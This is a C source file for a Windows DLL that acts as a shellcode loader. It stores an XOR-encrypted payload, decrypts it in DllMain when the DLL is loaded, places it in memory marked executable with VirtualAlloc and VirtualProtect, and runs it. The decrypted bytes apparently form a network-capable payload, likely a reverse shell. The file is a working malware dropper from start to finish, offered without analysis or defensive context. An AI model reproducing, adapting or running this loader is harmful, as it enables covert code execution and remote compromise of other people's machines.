#include <stdio.h>
#include <Windows.h> 

unsigned char buffer[] =
"\x97\x23\xe8\x8f\x9b\x83\xab\x6b\x6b\x6b\x2a\x3a\x2a\x3b\x39\x3a\x3d\x23\x5a\xb9\x0e\x23\xe0\x39\x0b\x23\xe0\x39\x73\x23\xe0\x39\x4b\x23\xe0\x19\x3b\x23\x64\xdc\x21\x21\x26\x5a\xa2\x23\x5a\xab\xc7\x57\x0a\x17\x69\x47\x4b\x2a\xaa\xa2\x66\x2a\x6a\xaa\x89\x86\x39\x2a\x3a\x23\xe0\x39\x4b\xe0\x29\x57\x23\x6a\xbb\xe0\xeb\xe3\x6b\x6b\x6b\x23\xee\xab\x1f\x0c\x23\x6a\xbb\x3b\xe0\x23\x73\x2f\xe0\x2b\x4b\x22\x6a\xbb\x88\x3d\x23\x94\xa2\x2a\xe0\x5f\xe3\x23\x6a\xbd\x26\x5a\xa2\x23\x5a\xab\xc7\x2a\xaa\xa2\x66\x2a\x6a\xaa\x53\x8b\x1e\x9a\x27\x68\x27\x4f\x63\x2e\x52\xba\x1e\xb3\x33\x2f\xe0\x2b\x4f\x22\x6a\xbb\x0d\x2a\xe0\x67\x23\x2f\xe0\x2b\x77\x22\x6a\xbb\x2a\xe0\x6f\xe3\x23\x6a\xbb\x2a\x33\x2a\x33\x35\x32\x31\x2a\x33\x2a\x32\x2a\x31\x23\xe8\x87\x4b\x2a\x39\x94\x8b\x33\x2a\x32\x31\x23\xe0\x79\x82\x3c\x94\x94\x94\x36\x22\xd5\x1c\x18\x59\x34\x58\x59\x6b\x6b\x2a\x3d\x22\xe2\x8d\x23\xea\x87\xcb\x6a\x6b\x6b\x22\xe2\x8e\x22\xd7\x69\x6b\x6a\xd0\xab\xc3\x6d\xe9\x2a\x3f\x22\xe2\x8f\x27\xe2\x9a\x2a\xd1\x27\x1c\x4d\x6c\x94\xbe\x27\xe2\x81\x03\x6a\x6a\x6b\x6b\x32\x2a\xd1\x42\xeb\x00\x6b\x94\xbe\x3b\x3b\x26\x5a\xa2\x26\x5a\xab\x23\x94\xab\x23\xe2\xa9\x23\x94\xab\x23\xe2\xaa\x2a\xd1\x81\x64\xb4\x8b\x94\xbe\x23\xe2\xac\x01\x7b\x2a\x33\x27\xe2\x89\x23\xe2\x92\x2a\xd1\xf2\xce\x1f\x0a\x94\xbe\x23\xea\xaf\x2b\x69\x6b\x6b\x22\xd3\x08\x06\x0f\x6b\x6b\x6b\x6b\x6b\x2a\x3b\x2a\x3b\x23\xe2\x89\x3c\x3c\x3c\x26\x5a\xab\x01\x66\x32\x2a\x3b\x89\x97\x0d\xac\x2f\x4f\x3f\x6a\x6a\x23\xe6\x2f\x4f\x73\xad\x6b\x03\x23\xe2\x8d\x3d\x3b\x2a\x3b\x2a\x3b\x2a\x3b\x22\x94\xab\x2a\x3b\x22\x94\xa3\x26\xe2\xaa\x27\xe2\xaa\x2a\xd1\x12\xa7\x54\xed\x94\xbe\x23\x5a\xb9\x23\x94\xa1\xe0\x65\x2a\xd1\x63\xec\x76\x0b\x94\xbe\xd0\x9b\xde\xc9\x3d\x2a\xd1\xcd\xfe\xd6\xf6\x94\xbe\x23\xe8\xaf\x43\x57\x6d\x17\x61\xeb\x90\x8b\x1e\x6e\xd0\x2c\x78\x19\x04\x01\x6b\x32\x2a\xe2\xb1\x94\xbe";

unsigned char key = 'k'; 

void PayloadDecryption(unsigned char* pShellcode, SIZE_T sShellcodeSize, unsigned char encryptionkey) {
    for (unsigned int i = 0; i < sShellcodeSize; i++)
    {
        pShellcode[i] ^= key; 
    }

}
int PayloadExecution(unsigned char* pShellcode, SIZE_T sShellcodeSize)
{
    // allocate memory to payload
    void* execMem = VirtualAlloc(NULL, sShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); 
    if (execMem == NULL)
    {
        printf("[-] Virtual allocator failed: %d", GetLastError()); 
        return -1; 
    }

    // copy decrypted payload to memory
    memcpy(execMem, pShellcode, sShellcodeSize); 

    // change protection settings of payload
    DWORD oldProtect;
    if (!VirtualProtect(execMem, sShellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
        printf("[-] VirtualProtect failed: %d\n", GetLastError());
        VirtualFree(execMem, 0, MEM_RELEASE); // Free the allocated memory on failure
        return -1;
    }

    // Assuming the shellcode is a function of type void(*)()
    void (*shellcodeFunc)() = (void (*)())execMem;
    shellcodeFunc(); // Execute the shellcode

    // Clean up
    VirtualFree(execMem, 0, MEM_RELEASE);
    return 0;

}
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        PayloadDecryption(buffer, sizeof(buffer), key); 
        // Attempt to execute the decrypted payload
        if (PayloadExecution(buffer, sizeof(buffer)) != 0) {
            printf("[-]Payload execution failed.\n");
            return FALSE;
        }
        break; 
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE; 
}

